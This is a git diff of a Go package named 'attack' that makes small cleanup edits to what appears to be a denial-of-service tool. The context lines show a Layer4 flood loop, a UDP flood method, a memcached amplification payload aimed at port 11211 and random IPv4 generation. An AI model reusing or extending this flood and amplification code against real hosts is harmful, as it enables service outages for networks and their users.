@@ -3,7 +3,6 @@ package attack
 import (
 	"context"
 	crand "crypto/rand"
-	"encoding/binary"
 	"math/rand"
 	"net"
 	"time"
@@ -49,7 +48,7 @@ func itoa(n int) string {
 	}()
 }
 
-// Run starts the flood loop until ctx is cancelled.
+// Run starts the flood loop until ctx is canceled.
 // Strategy Pattern: method is resolved once via l4Registry; no switch needed.
 func (l *Layer4) Run(ctx context.Context) {
 	fn, ok := l4Registry[l.Method]
@@ -109,7 +108,7 @@ func (l *Layer4) udp() {
 	}
 }
 
-func (l *Layer4) ampPayload() ([]byte, uint16) {
+func (l *Layer4) ampPayload() (payload []byte, port uint16) {
 	switch l.Method {
 	case "MEM":
 		return []byte("\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n"), 11211
@@ -259,11 +258,4 @@ func randIPv4() string {
 		byte(rand.Intn(256)),
 		byte(rand.Intn(256)),
 	).String()
-}
-
-// le16 encodes n as little-endian uint16 bytes.
-func le16(n uint16) []byte {
-	b := make([]byte, 2)
-	binary.LittleEndian.PutUint16(b, n)
-	return b
 }
